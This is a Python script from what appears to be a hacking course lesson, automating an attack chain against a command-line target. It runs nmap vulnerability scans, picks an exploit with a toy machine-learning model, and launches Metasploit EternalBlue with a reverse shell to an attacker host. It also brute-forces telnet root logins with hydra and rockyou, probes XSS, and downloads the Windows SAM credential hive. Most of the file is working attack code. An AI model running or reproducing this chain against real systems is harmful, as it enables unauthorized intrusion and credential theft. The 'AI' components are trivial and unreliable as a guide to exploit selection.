# chain.py - Fully Updated and Fixed Automated Exploit Chain with AI Integration
# Week 10, Day 2: Script Chains for Hacking Automation
# Fixes: Longer nmap timeout (300s), faster timing (-T4), command-line IP input only.
# Requirements: python3-sklearn, pwntools, metasploit-framework, requests, hydra (sudo apt install hydra)
# Usage: python3 chain.py <target_ip>

import subprocess
import json
import numpy as np
import xml.etree.ElementTree as ET
from sklearn.ensemble import IsolationForest
from sklearn.linear_model import LogisticRegression
import requests
import sys

# AI Model Setup: Expanded to include Linux exploits
train_features = [
    [1, 0, 0, 0],  # SMB
    [0, 1, 0, 0],  # HTTP
    [0, 0, 1, 0],  # SQL
    [0, 0, 0, 1],  # Telnet
    [1, 1, 0, 0]   # Mixed
]
train_labels = ['EternalBlue', 'XSS', 'SQLi', 'TelnetBrute', 'EternalBlue']
exploit_model = LogisticRegression()
exploit_model.fit(train_features, train_labels)

# Recon Module: Nmap with longer timeout and faster options
def recon(target):
    print(f"[RECON] Scanning target: {target}")
    try:
        result = subprocess.run(['nmap', '-sV', '--script=vuln', '-T4', '-oX', '-', target], 
                                capture_output=True, text=True, timeout=300)  # Longer timeout, faster timing
    except subprocess.TimeoutExpired:
        print("[ERROR] Nmap timed out.")
        return None
    if result.returncode != 0:
        print(f"[ERROR] Recon failed: {result.stderr}")
        return None
    
    # Parse XML
    try:
        root = ET.fromstring(result.stdout)
    except ET.ParseError as e:
        print(f"[ERROR] XML parse failed: {e}")
        return None
    
    ports = []
    for host in root.findall('host'):
        for port in host.findall('ports/port'):
            if port.find('state').get('state') == 'open':
                service_elem = port.find('service')
                service = service_elem.get('name') if service_elem is not None else 'unknown'
                ports.append({'port': int(port.get('portid')), 'service': service})
    
    # AI Anomaly Detection
    if ports:
        anomaly_model = IsolationForest(contamination=0.1)
        normal_ports = np.array([[22, 100], [80, 200], [443, 300], [23, 50]])
        anomaly_model.fit(normal_ports)
        
        for port in ports:
            vector = np.array([[port['port'], hash(port['service']) % 1000]])
            score = anomaly_model.decision_function(vector)[0]
            if score < 0:
                print(f"[AI ALERT] Anomalous port detected: {port} - Potential high-risk vuln!")
    
    print(f"[RECON] Found {len(ports)} ports: {ports}")
    return ports

# Exploit Chain Module (unchanged)
def exploit_chain(target, recon_data):
    print("[EXPLOIT] Analyzing recon data for chain...")
    has_smb = any(p['service'] == 'smb' for p in recon_data)
    has_http = any('http' in p['service'] for p in recon_data)
    has_sql = any('sql' in str(p) for p in recon_data)
    has_telnet = any(p['service'] == 'telnet' for p in recon_data)
    features = [int(has_smb), int(has_http), int(has_sql), int(has_telnet)]
    
    predicted_exploit = exploit_model.predict([features])[0]
    print(f"[AI PREDICTION] Suggested exploit: {predicted_exploit}")
    
    if predicted_exploit == 'EternalBlue' and has_smb:
        print("[CHAIN] Executing EternalBlue...")
        msf_cmd = [
            'msfconsole', '-q', '-x',
            f"use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target}; set LHOST 10.10.14.XX; set LPORT 4444; exploit"
        ]
        result = subprocess.run(msf_cmd, capture_output=True, text=True)
        if 'Meterpreter session' in result.stdout:
            return '1'
        else:
            print(f"[FAIL] EternalBlue failed: {result.stderr}")
    elif predicted_exploit == 'XSS' and has_http:
        print("[CHAIN] Executing XSS (placeholder)...")
        vuln_url = f"http://{target}/search?q=<script>alert(1)</script>"
        try:
            response = requests.get(vuln_url, timeout=10)
            if 'alert(1)' in response.text:
                return 'web_session'
        except requests.RequestException as e:
            print(f"[ERROR] XSS request failed: {e}")
    elif predicted_exploit == 'TelnetBrute' and has_telnet:
        print("[CHAIN] Executing Telnet Brute Force...")
        brute_cmd = [
            'hydra', '-l', 'root', '-P', '/usr/share/wordlists/rockyou.txt', '-t', '4', f'telnet://{target}'
        ]
        result = subprocess.run(brute_cmd, capture_output=True, text=True)
        if 'login:' in result.stdout or 'password:' in result.stdout or result.returncode == 0:
            print("[SUCCESS] Telnet creds found.")
            return 'telnet_session'
        else:
            print(f"[FAIL] Telnet brute failed: {result.stderr}")
    return None

# Post-Exploitation Module (unchanged)
def post_ex(session_id):
    print(f"[POST-EX] Escalating and exfiling via session {session_id}...")
    if session_id == '1':
        msf_cmd = [
            'msfconsole', '-q', '-x',
            f"sessions -i {session_id}; getsystem; download C:\\Windows\\System32\\config\\sam /tmp/sam.dump"
        ]
        subprocess.run(msf_cmd)
        print("[SUCCESS] Windows post-ex complete.")
    elif session_id == 'web_session':
        print("[POST-EX] Web exfil simulated.")
    elif session_id == 'telnet_session':
        print("[POST-EX] Telnet shell access - escalate manually or add commands.")
    print("[POST-EX] Chain complete.")

# Full Chain Integration (unchanged)
def full_chain(target):
    print("=== STARTING AUTOMATED EXPLOIT CHAIN ===")
    recon_data = recon(target)
    if not recon_data:
        return
    session_id = exploit_chain(target, recon_data)
    if session_id:
        post_ex(session_id)
        print("=== CHAIN SUCCESSFUL ===")
    else:
        print("Chain aborted: No exploit success.")

# Main Execution (unchanged)
if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 chain.py <target_ip>")
        sys.exit(1)
    target = sys.argv[1]
    full_chain(target)
    print("[WIN CHECK] Fixed chain executed. Push to GitHub.")
